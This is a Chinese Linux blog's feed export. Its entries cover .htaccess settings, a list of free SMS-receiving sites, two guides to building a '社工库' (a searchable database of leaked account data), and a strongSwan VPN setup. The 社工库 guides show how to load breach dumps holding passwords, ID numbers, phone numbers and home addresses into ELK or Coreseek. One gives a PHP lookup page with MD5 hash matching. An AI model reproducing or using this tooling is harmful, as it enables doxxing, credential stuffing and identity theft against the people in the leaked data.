mod_autoindex.c&gt;<br> IndexOptions FancyIndexing<br>&lt;/ifModule&gt;<br></pre><br>通过这个选项，你可以实现自定义图标、添加文件类型描述、按日期排序等。但是这些已经超过了本文的讨论范围，Lesca可以给你一个做好的<a href="http://corz.org/serv/resources/file_view.htaccess.txt?raw=true" title="file_view.htaccess" target="_blank" rel="external">例子</a>，你可以在<a href="http://corz.org/public/images/" target="_blank" rel="external">这页查看效果</a>。<br><br>### 4.配置目录主页文件<br><br>即使启用了目录浏览，Apache未必会展示该目录的内容，因为该目录可能存在像index.htm这样的默认主页文件。Apache会有限展示主页文件，我们可以通过.htaccess设置：<br><pre>DirectoryIndex index.html index.php index.htm<br></pre><br><br>### 5.配置错误页面<br><br>如果Apache遇到错误，就会输出错误页面。配置自定义的错误页面，也许可以挽留即将离开的用户。<br><pre># custom error documents<br>ErrorDocument 401 /err/401.php<br>ErrorDocument 403 /err/403.php<br>ErrorDocument 404 /err/404.php<br>ErrorDocument 500 /err/500.php<br></pre><br><br>## 五、URL重写与URL重定向<br><br>下一篇文章，我们将介绍htaccess的重头戏：<a href="http://lesca.me/archives/htaccess-rewrite.html" target="_blank" rel="external">URL重写与URL重定向</a><br><br>## References:<br><br>[1] <a href="http://corz.org/serv/tricks/htaccess.php" target="_blank" rel="external">.htaccess tips and tricks</a><br>[2] <a href="http://perishablepress.com/stupid-htaccess-tricks/" target="_blank" rel="external">Stupid htaccess Tricks</a><br>[3] <a href="http://httpd.apache.org/docs/2.2/mod/core.html#files" target="_blank" rel="external">Files Directive</a><br><br></div><br><div class="text_add"><br><br>本文出自 Lesca技术宅，转载时请注明出处及相应链接。<br><br>本文永久链接: <a href="http://lesca.me/archives/htaccess-basic.html" target="_blank" rel="external">http://lesca.me/archives/htaccess-basic.html</a><br><br></div>]]></content>
    
    <summary type="html">
    
      &lt;div class=&quot;text&quot;&gt;&lt;br&gt;&lt;br&gt;## 一、.htaccess简介&lt;br&gt;&lt;br&gt;### 1.什么是.htaccess&lt;br&gt;&lt;br&gt;.htaccess是一个纯文本文件，里面存放着Apache服务器配置相关的一些指令，它类似于Apache的站点配置文件，如htt
    
    </summary>
    
      <category term="apache" scheme="http://www.linux52.com/categories/apache/"/>
    
    
  </entry>
  
  <entry>
    <title>几个可以免费在线</title>
    <link href="http://www.linux52.com/2016-07-05-e5-87-a0-e4-b8-aa-e5-8f-af-e4-bb-a5-e5-85-8d-e8-b4-b9-e5-9c-a8-e7-ba-bf.html"/>
    <id>http://www.linux52.com/2016-07-05-e5-87-a0-e4-b8-aa-e5-8f-af-e4-bb-a5-e5-85-8d-e8-b4-b9-e5-9c-a8-e7-ba-bf.html</id>
    <published>2016-07-05T06:51:42.000Z</published>
    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="几个可以免费在线收短信的网站"><a href="#几个可以免费在线收短信的网站" class="headerlink" title="几个可以免费在线收短信的网站"></a>几个可以免费在线收短信的网站</h1><pre class="prettyprint linenums">Receive-SMS.com
Address: www.receive-sms.com  www.receive-sms.com
Country of the phone number: UK, Sweden8
Requirements:No registration.! 

ReceiveFreeSMS.com
Address: www.receivefreesms.com
Country of the phone number: US, UK, Norway, Sweden, Netherlands, Australia, Hungary, Lithuania, Spai
Requirements:No registration
ReceiveSMSOnline.net
Address: www.receivesmsonline.net
Country of the phone number: US, UK
Requirements:No registration.
 FreeOnlinePhone.org
Address: www.freeonlinephone.org
Country of the phone number: US
Requirements:No registratio
 Receive-sms-online.com
Address: http://receive-sms-online.com
Country of the phone number: Norway, UK;
Requirements:No registration.

Sellaite

Address: http://sellaite.com/smsreceiver
Country of the phone number: Estonia
Requirements:No registration.8 O"

receivesmsonline.com/
receivefreesms.com/

sellaite.com/smsreceiver/
</pre>

<h1 id="免费匿名在线发短信跟传真"><a href="#免费匿名在线发短信跟传真" class="headerlink" title="免费匿名在线发短信跟传真"></a>免费匿名在线发短信跟传真</h1><pre class="prettyprint linenums">
www.afreesms.com/intl/china

传真 www.myfax.com/free/
</pre>

<p>转载至：<a href="http://www.138vps.com/freeot/532.html" target="_blank" rel="external">http://www.138vps.com/freeot/532.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;几个可以免费在线收短信的网站&quot;&gt;&lt;a href=&quot;#几个可以免费在线收短信的网站&quot; class=&quot;headerlink&quot; title=&quot;几个可以免费在线收短信的网站&quot;&gt;&lt;/a&gt;几个可以免费在线收短信的网站&lt;/h1&gt;&lt;pre class=&quot;prettyprint l
    
    </summary>
    
      <category term="记录" scheme="http://www.linux52.com/categories/%E8%AE%B0%E5%BD%95/"/>
    
    
  </entry>
  
  <entry>
    <title>使用ELK搭建社工库</title>
    <link href="http://www.linux52.com/2016-07-03-e4-bd-bf-e7-94-a8elk-e6-90-ad-e5-bb-ba-e7-a4-be-e5-b7-a5-e5-ba-93.html"/>
    <id>http://www.linux52.com/2016-07-03-e4-bd-bf-e7-94-a8elk-e6-90-ad-e5-bb-ba-e7-a4-be-e5-b7-a5-e5-ba-93.html</id>
    <published>2016-07-03T15:01:23.000Z</published>
    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>来自： <a href="https://www.t00ls.net/articles-32593.html" target="_blank" rel="external">https://www.t00ls.net/articles-32593.html</a></p>
<div><br><div><br><br>0x01 ELK是什么东西?<br><br>ELK是ElasticSearch、Logstash、Kibana三个应用的缩写。 ElasticSearch简称ES，主要用来存储和检索数据。Logstash主要用来往ES中写入数据。Kibana主要用来展示数据。<br><br>0x02 为什么用ELK?<br><br>传统的社工库通常用MySQL数据库来进行搭建，在相当大的数据下检索效率非常低下。在这种关系型数据库中进行查询需要明确指定列名。而在ES中可用全文检索，并且在大数据的查询中的响应几乎都是毫秒级的，速度相当之快！ELK原本用在日志的大数据收集和分析，其可怕的速度作为社工库也是一种不错的选择。<br><br>0x03 安装和配置<br><br>前提你需要一个很大的硬盘,大约社工库容量2.5倍的硬盘(ES会创建相关索引)。<br><br>你需要安装java至少7以上的版本。并且配置JAVA_HOME环境变量.<br><br>因为安装非常简单，只需要下载相应的压缩文件，解压即可。在此不再赘述。<br><br>我此次演示的环境在Windows8.1上,ES在Linux中不能使用root权限运行。<br><br>ES 2.0.0  Logstash 2.0.0  Kibana 4.2.0<br><br>修改配置文件：<br><br>ES/config/elasticsearch.yml<br><br>cluster.name: esdemo (集群的描述信息)<br><br>node.name: 63 (节点名称)<br><br>network.host: 192.168.1.5 (绑定的IP地址)<br><br>http.port: 9200 (端口号 默认9200)<br><br>一些Linux环境需要修改 ES/bin/elasticsearch 文件 增加<br><br>export JAVA_HOME=JDK路径<br><br>启动 ES/bin/elasticsearch或者elasticsearch.bat 即可启动<br><br>然后访问 <a href="http://localhost/IP:9200" target="_blank" rel="external">http://localhost/IP:9200</a> 可查看是否正常运行<br><br>Kibana/config/kibana.yml<br><br>elasticsearch.url: “<a href="http://192.168.1.5:9200" target="_blank" rel="external">http://192.168.1.5:9200</a>“ 指定ES地址<br><br>执行Kibana/bin/kibana 或者 kibana.bat启动<br><br>查看 <a href="http://localhost:5601" target="_blank" rel="external">http://localhost:5601</a> 是否正常启动<br><br>ElasticSearch 天生就很好的支持分布式,如果环境允许可以多使用几台负载。<br><br>为了方便理解 把ES中的一些概念和MySQL进行对比<br><br>ES  index(索引)  type(类型)  document(文档)                field(字段)<br><br>MySQL database  table                row                column<br><br>0x04 社工库搭建<br><br>以上工作准备完成之后,就该进入搭建的阶段了.首先确定有哪些列名存在ES中，我自己存了10列，给大家做个参考.<br><br>nickname(昵称)、password(密码)、email(邮箱)、qq(QQ号)、telno(手机号码)、idno(身份证号码)、realname(真实姓名)、address(家庭住址)、salt(盐值)、from(数据来源)。相对来说我这样划分的还是蛮详细的。但是在用Logstash写入ES的过程当中就比较费时了。其实如果想偷懒，完全可以把现有的数据只作为一个field写入，也是可以查询出来的。但是这样会比较乱，看着很不舒服。<br><br>我现在的主要做法是对一些现有的CSV文件,使用脚本进行清洗，洗成我规定的这些字段的格式。如果是.sql文件，则直接丢进mysql,然后再导出csv文件。也就是说不同的网站数据库最终全部是csv文件，并且是格式相同的csv。有字段不存在的则使用空字符替代。这样的话,可以在不更改logstash配置文件的情况下直接导入ES，也方便进行迁移。<br><br>配置logstash 文件(test.conf)<br><br></div><br><a href="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070315022290.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070315022290.png" alt="20160301185523_2"></a><br><br>然后在logstash bin目录下面执行<br><br>Logstash.bat -f test.conf<br><br>就可以看到如下图:<br><br><a href="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070315025761.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070315025761.png" alt="20160301185524_598"></a><br><br>正在往ES中写入数据。<br><br>在重复测试时，请注意要删除home目录下的sincedb文件。我提供了一段python代码来进行这些操作。<br><br><a href="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070315033686.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070315033686.png" alt="20160301185524_192"></a><br><br>以上代码主要是用来删除创建的索引中的数据并且删除一些临时文件.<br><br>数据写完之后可以查看<br><br><a href="http://ip地址:9200/_cat/indices?v" target="_blank" rel="external">http://ip地址:9200/_cat/indices?v</a><br><br>来查看索引的信息<br><br>登录 Kibana<br><br><a href="http://localhost:5601/" target="_blank" rel="external">http://localhost:5601/</a><br><br>点击settings — index patterns Add new –输入你创建的index名称,点击create完成.<br><br>然后可以在Discover中进行搜索。<br><br><a href="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070315040631.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070315040631.png" alt="20160301185524_512"></a><br><br>也可以指定字段名进行搜索 例如：telno:13588888888.该语法为lucene 语法.<br><br>Have fun!!!<br><br>PS:<br><br>1、如果一亿条数据，本机测试也是毫秒级的查询，目前3亿条数据，速度也是很快。<br><br>2、这三款软件全部开源。可以在ES的官方下载，下载之后，简单的配置即可使用。<br><br></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;来自： &lt;a href=&quot;https://www.t00ls.net/articles-32593.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.t00ls.net/articles-32593.html&lt;/a&gt;&lt;/p&gt;

    
    </summary>
    
      <category term="数据库应用" scheme="http://www.linux52.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>搭建基于PHP+Mysql+Coreseek的社工库</title>
    <link href="http://www.linux52.com/2016-07-03-e6-90-ad-e5-bb-ba-e5-9f-ba-e4-ba-8ephpmysqlcoreseek-e7-9a-84-e7-a4-be-e5-b7-a5-e5-ba-93.html"/>
    <id>http://www.linux52.com/2016-07-03-e6-90-ad-e5-bb-ba-e5-9f-ba-e4-ba-8ephpmysqlcoreseek-e7-9a-84-e7-a4-be-e5-b7-a5-e5-ba-93.html</id>
    <published>2016-07-02T18:26:02.000Z</published>
    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>引用至 <a href="https://0x0d.im/archives/build-social-engineer-database-based-on-php-mysql-coreseek.html" target="_blank" rel="external">博客</a></p>
<p>之前下载过一些裤子，但是没怎么用过……一来是维护自己的社工库费时费力，二来在线的社工库也基本够用了。</p>
<p>后来导了一个10多G的裤子进 Mysql ，单表，数据有近2亿条，即使加了索引查起来也慢的不行，有时候还没有用暴力搜索文本内容的小工具查的快。于是查了下资料，试了试用 Coreseek 做全文索引，速度不错（毫秒级）。</p>
<p>从<a href="http://www.coreseek.cn/" target="_blank" rel="external">官网</a>下载最新版（4.1）的 Coreseek ，解压到某个目录，打开 etc 目录，里面有个 <code>csft_mysql.conf</code> 配置示例文件，贴一下我的配置文件（命名为 sed.conf ）：</p>
<p><pre class="prettyprint linenums">#源定义<br>source sed<br>{<br>    type                    = mysql<br>    sql_host                = localhost<br>    sql_user                = test<br>    sql_pass                = test<br>    sql_db                    = sed<br>    sql_port                = 3306<br>    sql_query_pre            = SET NAMES utf8<br>    sql_query                = SELECT <code>id</code>, <code>username</code>, <code>password</code>, <code>email</code>, <code>salt</code>, <code>order</code> FROM md5_sgk    #sql_query第一列id需为整数，username、password、email等作为字符串/文本字段，被全文索引<br>    sql_attr_uint            = id           #从SQL读取到的值必须为整数</pre></p>
<pre><code>#sql_field_string    = username
#sql_field_string    = password
#sql_field_string    = email
#sql_attr_timestamp        = date_added  #从SQL读取到的值必须为整数，作为时间属性
sql_query_info_pre      = SET NAMES utf8                                        #命令行查询时，设置正确的字符集
sql_query_info            = SELECT `id`, `username`, `password`, `email`, `salt`, `order` FROM md5_sgk WHERE id=$id #命令行查询时，从数据库读取原始数据信息
</code></pre><p>}</p>
<p>#index定义<br>index sed<br>{<br>    source            = sed           #对应的source名称<br>    path            = E:/SQL_DATA/coreseek/var/data/sed #请修改为实际使用的绝对路径，例如：/usr/local/coreseek/var/…<br>    docinfo            = extern<br>    mlock            = 0<br>    morphology        = none<br>    min_word_len        = 1<br>    ondisk_dict     = 1   #索引不载入内存而是保存在硬盘上<br>    html_strip                = 0</p>
<pre><code>#中文分词配置，详情请查看：http://www.coreseek.cn/products-install/coreseek_mmseg/
#charset_dictpath = /usr/local/mmseg3/etc/ #BSD、Linux环境下设置，/符号结尾
charset_dictpath = E:/SQL_DATA/coreseek/etc/ #Windows环境下设置，/符号结尾，最好给出绝对路径，例如：C:/usr/local/coreseek/etc/...
charset_type        = zh_cn.utf-8
</code></pre><p>}</p>
<p>#全局index定义<br>indexer<br>{<br>    mem_limit            = 1024M<br>}</p>
<p>#searchd服务定义<br>searchd<br>{<br>    listen                  =   9312<br>    read_timeout        = 5<br>    max_children        = 30<br>    max_matches            = 1000<br>    seamless_rotate        = 0<br>    preopen_indexes        = 0<br>    unlink_old            = 1<br>    pid_file = E:/SQL_DATA/coreseek/var/log/searchd_mysql.pid  #请修改为实际使用的绝对路径，例如：/usr/local/coreseek/var/…<br>    log = E:/SQL_DATA/coreseek/var/log/searchd_mysql.log        #请修改为实际使用的绝对路径，例如：/usr/local/coreseek/var/…<br>    query_log = E:/SQL_DATA/coreseek/var/log/query_mysql.log #请修改为实际使用的绝对路径，例如：/usr/local/coreseek/var/…<br>    binlog_path =                                #关闭binlog日志<br>}<br><br>具体的配置信息可以看看<a href="http://www.coreseek.cn/docs/coreseek_4.1-sphinx_2.0.1-beta.html" target="_blank" rel="external">官方手册</a>。</p>
<p>有些资料里使用了 <strong>sql_field_string</strong>，但是据测试很可能出现 <a href="http://sphinxsearch.com/bugs/view.php?id=1131" target="_blank" rel="external">too many string attributes (current index format allows up to 4 GB)</a> 这个错误，不知是不是因为是32位程序的原因，所以最好不要用，或者可以试试64位的 <strong><a href="http://sphinxsearch.com/downloads/release/" target="_blank" rel="external">Sphinx</a></strong>。</p>
<p>然后把 <strong>searchd</strong> 注册成服务 <code>searchd --install --config ..\etc\sed.conf</code>，以免每次使用都要在命令行窗口打开。</p>
<p>接着用 <code>indexer -c ..\etc\sed.conf --all --rotate</code> 建立全文索引。<br>如果有增量索引的还要合并索引（我测试的时候并没有做增量索引，可以参考<a href="http://blog.csdn.net/e421083458/article/details/21529969" target="_blank" rel="external">这篇文章</a>。）</p>
<p>索引建立完后试试能否正常搜索： <code>search -c ..\etc\sed.conf adwin</code> ，如果出现 search error: failed to open xxx.sph: No such file or directory 这个错误，可能原因有：</p>
<blockquote>
<p>It seems that</p>
<p>a) the lock files were lost somehow, and</p>
<p>b) you ran indexer without –rotate switch.</p>
<p>Normally, searchd would create .spl lock files on startup (and kill them on shutdown),</p>
<p>and indexer would then refuse to reindex without –rotate switch.</p>
<p>indexers sends SIGHUP to searchd when completed (and it should print that out). searchd</p>
<p>then does the following:</p>
<ol>
<li>waits for all children to exit</li>
<li>renames current index files to .old</li>
<li>renames .new index files to current</li>
<li>tries to load current index files</li>
<li>if something failed, it rollbacks current files from .old and new to .new</li>
</ol>
<p>In your case I would start with double checking directory access rights, users which both</p>
<p>indexer and searchd run under, etc.<br>据我的经验一般把 data 目录下的文件名里多出来的<code>.new</code>去掉就好。</p>
</blockquote>
<p>最后调用自带的 <strong>sphinxapi.php</strong> 即可，我直接用的 Ph4nt0m 的源码（界面用 Bootstrap 重写了下）：</p>
<p><pre class="prettyprint linenums"><br>&lt;?php<br>// 引用sphinxapi类<br>require “sphinxapi.php”;<br>//关闭错误提示<br>error_reporting(E_ALL &amp; ~E_NOTICE);<br>$num = 0;<br>if (!empty($_GET) &amp;&amp; !empty($_GET[‘q’])) {<br>    $Keywords = strip_tags(trim($_GET[‘q’]));<br>    if (!empty($_GET[‘m’]) &amp;&amp; 1 == $_GET[‘m’]) {<br>        $Keywords = substr(md5($Keywords), 8, 16);<br>    }<br>    if (!empty($_GET[‘m’]) &amp;&amp; 2 == $_GET[‘m’]) {<br>        $Keywords = md5($Keywords);<br>    }<br>    $cl = new SphinxClient();<br>    // 返回结果设置<br>    $cl-&gt;SetServer(‘127.0.0.1’, 9312);<br>    $cl-&gt;SetConnectTimeout(3);<br>    $cl-&gt;SetArrayResult(true);<br>    // 设置是否全文匹配<br>    if (!empty($_GET) &amp;&amp; !empty($_GET[‘f’])) {<br>        $cl-&gt;SetMatchMode(SPH_MATCH_ALL);<br>    } else {<br>        $cl-&gt;SetMatchMode(SPH_MATCH_ANY);<br>    }<br>    if (!empty($_GET) &amp;&amp; !empty($_GET[‘p’])) {<br>        $p = !intval(trim($_GET[‘p’])) == 0 ? intval(trim($_GET[‘p’])) - 1 : 0;<br>        $p = $p <em> 20;<br>        // 我在sed.conf 设置了最大返回结果数1000。但是我在生成页码的时候最多生成20页，我想能满足大部分搜索需求了。<br>        // 以下语句表示从P参数偏移开始每次返回20条。<br>        $cl-&gt;setLimits($p, 20);<br>    } else {<br>        $cl-&gt;setLimits(0, 20);<br>    }<br>    $res = $cl-&gt;Query(“.$Keywords.”, “</em>“);<br>    @mysql_connect(“localhost”, “test”, “test”); //数据库账号密码<br>    mysql_select_db(“sed”); //数据库库名名<br>    if (is_array($res[“matches”])) {<br>        foreach ($res[“matches”] as $docinfo) {<br>            $ids = $ids . $docinfo[id] . ‘,’;<br>        }<br>        $ids = rtrim($ids, ‘,’);<br>        $sql = “select * from md5_sgk where id in($ids)”; //注意修改表名<br>        mysql_query(“set names utf8”);<br>        $ret = mysql_query($sql);<br>        $num = mysql_num_rows($ret);<br>    }<br>}<br>?&gt;<br>&lt;!DOCTYPE html&gt;</pre></p>
<html><br><head><br>   <title>The Web of Answers</title><br>   <meta charset="UTF-8"><br>   <meta name="viewport" content="width=device-with,initial-scal=1"><br>   <link href="css/bootstrap.min.css" rel="stylesheet"><br>   <script src="js/jquery.js"></script><br>   <script src="js/bootstrap.min.js"></script><br>   <script><br>    function check(form){<br>        if(form.q.value==””){<br>          alert(“Not null !”);<br>          form.q.focus();<br>          return false;<br>        }<br>    }<br>    </script><br>   <style><br>        h1 {<br>            font-family: Times New Roman, Lucida Handwriting;<br>        }<br>        body {<br>            background-image: url(img/bg.jpg);<br>        }<br>   </style><br></head><br><body><br>    <div class="container" id="container"><br>        <div id="page-header"><br><br>#  The Web of Answers<br><br>        </div><br>        <div class="row"><br>        <form action="" method="get" class="form-horizontal" role="form"><br>            <div id="checkbox" class="col-md-6 col-md-offset-3"><br>                <label class="checkbox-inline"><br>                    <input type="checkbox" id="full" name="f" value="1">   完整匹配<br>                </label><br>                <label class="checkbox-inline"><br>                      <input type="checkbox" id="md5_16" name="m" value="1"><br>                       MD5匹配（16位）<br>                </label><br>                <label class="checkbox-inline"><br>                      <input type="checkbox" id="md5_32" name="m" value="2"><br>                       MD5匹配（32位）<br>                </label><br>            </div><br>            <div class="input-group col-md-6 col-md-offset-3"><br>                <input type="text" class="form-control" name="q" placeholder="请输入" value="<?php echo strip_tags(trim($_GET['q']));?>"><br>                    <div class="input-group-btn"><br>                        <button type="submit" class="btn btn-primary" onclick="check(form)">Search</button><br>                    </div><br>             </div><br>        </form><br>    </div><br><br>&lt;?php<br>if (0 == !$num) {<br>    echo “<div class="\"row\""><br>    <div class="\"alert" alert-success="" alert-dismissible="" col-md-10="" col-md-offset-1\"="" role="\"alert\""><br>    <button type="\"button\"" class="\"close\"" data-dismiss="\"alert\""><span aria-hidden="\"true\"">&times;</span><span class="\"sr-only\"">Close</span></button><br>    找到与<strong>&amp;nbsp{$Keywords}&amp;nbsp</strong>相关的结果 {$res[total_found]} 个。用时 {$res[time]} 秒。</div>“;<br>    echo “<div class="\"table-responsive" col-md-10="" col-md-offset-1\"=""><br>        <table class="\"table" table-striped="" table-hover\"=""><br>          <tr><br>          <th>Username</th><br>          <th>Email</th><br>          <th>Password</th><br>          <th>Salt</th><br>          <th>From</th><br>          </tr>“;<br>    while ($row = mysql_fetch_assoc($ret)) {<br>        echo “<tr><td>“ . $row[‘username’] . “</td>“;<br>        echo “<td>“ . $row[‘email’] . “</td>“;<br>        echo “<td>“ . $row[‘password’] . “</td>“;<br>        echo “<td>“ . $row[‘salt’] . “</td>“;<br>        echo “<td>“ . $row[‘order’] . “</td></tr>“;<br>    }<br>    echo “</table></div></div>“;<br>} else {<br>    if (!empty($_GET) &amp;&amp; !empty($_GET[‘q’])) {<br>        echo “<div class="\"alert" alert-warning="" alert-dismissible="" col-md-10="" col-md-offset-1\"="" role="\"alert\""><br>        <button type="\"button\"" class="\"close\"" data-dismiss="\"alert\""><span aria-hidden="\"true\"">&times;</span><span class="\"sr-only\"">Close</span></button><br>        找不到与<strong>&amp;nbsp{$Keywords}&amp;nbsp</strong>相关的结果。请更换其他关键词试试。</div></div>“;<br>    }<br>}<br>?&gt;<br>    <div id="pages"><br>    <center><br>        <nav><br><br>&lt;?php<br>if (0 == !$num) {<br>    $pagecount = (int) ($res[total_found] / 20);<br>    if (!($res[total_found] % 20) == 0) {<br>        $pagecount = $pagecount + 1;<br>    }<br>    if ($pagecount &gt; 20) {<br>        $pagecount = 20;<br>    }<br>    $highlightid = !intval(trim($_GET[‘p’])) == 0 ? intval(trim($_GET[‘p’])) : 1;<br>    for ($i = 1; $i &lt;= $pagecount; $i++) {<br>        if ($highlightid == $i) {<br>            echo “<em>   <a href="\">{$i}<span class="\"sr-only\"">(current)</span></a><br>“;<br>        } else {<br>            echo “</em>   <a href="\">{$i}</a><br>        </nav><br>    </center><br>    </div><br>    <div id="footer"><br><br>            The Web of Answers &copy;2010-2015 | Powered by b0rg<br><br>    </div><br>    <br></body><br></html>

<p><br><strong>效果：</strong><br><a href="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070317045815.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070317045815.png" alt="2340039264"></a></p>
<p><strong>参考资料：</strong></p>
<blockquote>
<p><a href="http://zone.wooyun.org/content/9377" target="_blank" rel="external">MySQL+Sphinx+CoreSeek数据库查询脚本</a></p>
<p><a href="http://www.freebuf.com/articles/database/53139.html" target="_blank" rel="external">经验分享：社会工程学数据库搭建TIPS</a></p>
<p><a href="http://blog.csdn.net/e421083458/article/details/21529969" target="_blank" rel="external">搭建coreseek(sphinx+mmseg3)详细安装配置+php之sphinx扩展安装+php调用示例</a></p>
<p><a href="http://www.coreseek.cn/docs/coreseek_4.1-sphinx_2.0.1-beta.html" target="_blank" rel="external">Coreseek 4.1 参考手册</a></p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;引用至 &lt;a href=&quot;https://0x0d.im/archives/build-social-engineer-database-based-on-php-mysql-coreseek.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;博客&lt;
    
    </summary>
    
      <category term="数据库应用" scheme="http://www.linux52.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Ubuntu安装和配置strongSwan</title>
    <link href="http://www.linux52.com/2016-06-15-ubuntu-e5-ae-89-e8-a3-85-e5-92-8c-e9-85-8d-e7-bd-aestrongswan.html"/>
    <id>http://www.linux52.com/2016-06-15-ubuntu-e5-ae-89-e8-a3-85-e5-92-8c-e9-85-8d-e7-bd-aestrongswan.html</id>
    <published>2016-06-15T14:58:28.000Z</published>
    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>记录在Ubuntu 14.04上安装和配置strongSwan的过程。</p>
<p>装完之后才发现只能在墙内翻腾，一番调查后发现客户端的IKE_AUTH包根本无法到达墙外的服务端，改端口也没用。不过好歹也折腾了一番，姑且记下来。</p>
<h2 id="编译安装strongSwan"><a href="#编译安装strongSwan" class="headerlink" title="编译安装strongSwan"></a>编译安装strongSwan</h2><p>Ubuntu 14.04仓库里的strongSwan是5.1.2版本的，稍微有点老，这里从官方网站下载最新的5.3.0版本。</p>
<div class="codehilite"><br><pre>cd /tmp<br>wget <a href="http://download.strongswan.org/strongswan-5.3.0.tar.bz2" target="_blank" rel="external">http://download.strongswan.org/strongswan-5.3.0.tar.bz2</a><br>tar xvf strongswan-5.3.0.tar.bz2<br>cd strongswan-5.3.0<br></pre><br></div><br>在编译strongSwan之前先安装一下依赖库:<br><div class="codehilite"><br><pre>sudo apt-get install libpam0g-dev libssl-dev build-essential<br></pre><br></div><br>参考网上的一篇<a href="https://hjc.im/shi-yong-strongswanda-jian-ipsecikev2-vpn/" target="_blank" rel="external">教程</a>，使用如下参数编译strongSwan。另外，如果你的VPS是OpenVZ服务器<sup id="fnref:1"><a href="http://blog.atime.me/note/strongSwan-setup-and-config-on-ubuntu-server.html#fn:1" target="_blank" rel="external">1</a></sup>，据说还应该再加上一个<code>--enable-kernel-libipsec</code>参数。<br><div class="codehilite"><br><pre>./configure  –enable-eap-identity –enable-eap-md5 \<br>–enable-eap-mschapv2 –enable-eap-tls –enable-eap-ttls –enable-eap-peap  \<br>–enable-eap-tnc –enable-eap-dynamic –enable-eap-radius –enable-xauth-eap  \<br>–enable-xauth-pam  –enable-dhcp  –enable-openssl  –enable-addrblock –enable-unity  \<br>–enable-certexpire –enable-radattr –enable-openssl –disable-gmp<br></pre><br></div><br>最后编译并安装<br><div class="codehilite"><br><pre>make<br>sudo make install<br></pre><br></div><br>如果在configure的时候没有配置<code>--prefix</code>参数，那么strongSwan默认被安装到<code>/usr/local</code>目录下，配置文件安装在<code>/usr/local/etc</code>目录下。<br><br>## 创建密钥和证书<br><br>这里可参考这篇<a href="https://www.zeitgeist.se/2013/11/22/strongswan-howto-create-your-own-vpn/" target="_blank" rel="external">文章</a>和官方wiki上的一篇<a href="https://wiki.strongswan.org/projects/strongswan/wiki/SimpleCA" target="_blank" rel="external">教程</a>。<br><br>为方便，下面的命令不再加sudo，可以直接su。<br><br>### 自签署根证书<br><br>首先创建一个根证书的RSA密钥:<br><div class="codehilite"><br><pre>cd /usr/local/etc/ipsec.d<br><br>ipsec pki –gen –type rsa \<br>–size 4096 –outform pem \<br>&gt; private/strongSwanCAKey.pem<br></pre><br></div><br>然后使用这个密钥自签署一个根证书(公钥):<br><div class="codehilite"><br><pre>ipsec pki –self –ca –lifetime 3650 \<br>–in private/strongSwanCAKey.pem –type rsa \<br>–dn “C=CH, O=strongSwan, CN=strongSwan Root CA” \<br>–outform pem &gt; cacerts/strongSwanCACert.pem<br></pre><br></div>

<h3 id="服务端密钥和证书"><a href="#服务端密钥和证书" class="headerlink" title="服务端密钥和证书"></a>服务端密钥和证书</h3><p>接下来，创建服务端使用的密钥和证书，<strong>记得</strong>把<code>--dn</code>和<code>--san</code>参数的<code>myvpn.domain</code>改成自己VPS的域名或IP<sup id="fnref:2"><a href="http://blog.atime.me/note/strongSwan-setup-and-config-on-ubuntu-server.html#fn:2" target="_blank" rel="external">2</a></sup><sup id="fnref:3"><a href="http://blog.atime.me/note/strongSwan-setup-and-config-on-ubuntu-server.html#fn:3" target="_blank" rel="external">3</a></sup>。</p>
<div class="codehilite"><br><pre>ipsec pki –gen –type rsa –size 2048 \<br>–outform pem &gt; private/strongSwanServerKey.pem<br><br>ipsec pki –pub –in private/strongSwanServerKey.pem –type rsa | \<br>ipsec pki –issue –lifetime 730 \<br>–cacert cacerts/strongSwanCACert.pem \<br>–cakey private/strongSwanCAKey.pem \<br>–dn “C=CH, O=strongSwan, CN=myvpn.domain” \<br>–san myvpn.domain \<br>–flag serverAuth –flag ikeIntermediate \<br>–outform pem &gt; certs/strongSwanServerCert.pem<br></pre><br></div>

<h3 id="客户端密钥和证书"><a href="#客户端密钥和证书" class="headerlink" title="客户端密钥和证书"></a>客户端密钥和证书</h3><p>然后生成客户端的密钥和证书，生成证书时<strong>记得</strong>把<code>--dn</code>和<code>--san</code>参数的邮件地址<code>aabb@myvpn.domain</code>改成自己的。</p>
